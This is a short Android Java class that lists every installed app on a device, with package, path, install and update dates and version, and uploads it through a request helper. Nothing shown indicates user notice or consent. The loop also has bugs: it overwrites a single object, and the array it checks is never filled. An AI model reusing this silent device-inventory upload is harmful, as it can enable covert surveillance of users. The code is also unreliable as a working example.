package com.inet.android.bs;

import java.util.Date;
import java.util.List;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.preference.PreferenceManager;

import com.inet.android.request.DataRequest;
import com.inet.android.utils.Logging;

@SuppressLint("NewApi")
public class ListApp {
	Context context;
	private Object ListAppTypeStr = "8";
	static SharedPreferences sp;

	private static String LOG_TAG = "ListApp";

	/**
	 * get the list of all installed applications in the device
	 * 
	 * @return ArrayList of installed applications or null
	 */
	@SuppressLint("NewApi")
	public void getListOfInstalledApp(Context context) {
		this.context = context;
		sp = PreferenceManager.getDefaultSharedPreferences(context);
		// -------initial json line----------------------
		String sendJSONStr = null;
		JSONObject jsonObject = new JSONObject();
		JSONArray data = new JSONArray();
		JSONObject info = new JSONObject();
		JSONObject object = new JSONObject();

		PackageManager packageManager = context.getPackageManager();
		final List<ApplicationInfo> installedApps = packageManager
				.getInstalledApplications(PackageManager.GET_META_DATA);
		for (ApplicationInfo app : installedApps) {

			try {
				PackageInfo packageInfo = packageManager.getPackageInfo(
						app.packageName, PackageManager.GET_PERMISSIONS);

				Date installTime = new Date(packageInfo.firstInstallTime);
				Date updateTime = new Date(packageInfo.lastUpdateTime);

				info.put("Package: ", app.packageName);
				info.put("Directory: ", app.sourceDir);
				info.put("Installed: ", installTime.toString());
				info.put("Updated: ", updateTime.toString());
				info.put("Version: ", packageInfo.versionCode);
				info.put("Name: ", packageInfo.versionName);

				// object.put("time", date.logTime());
				object.put("type", ListAppTypeStr);
				object.put("info", info);
				
			} catch (PackageManager.NameNotFoundException e) {
				e.printStackTrace();
			} catch (JSONException e) {
				Logging.doLog(LOG_TAG, "json сломался", "json сломался");
			}

		}
		
		sendJSONStr = data.toString();
		if (sendJSONStr != null) {
			DataRequest dr = new DataRequest(context);
			dr.sendRequest(object.toString());
			Logging.doLog(LOG_TAG, sendJSONStr);
		}
	}
}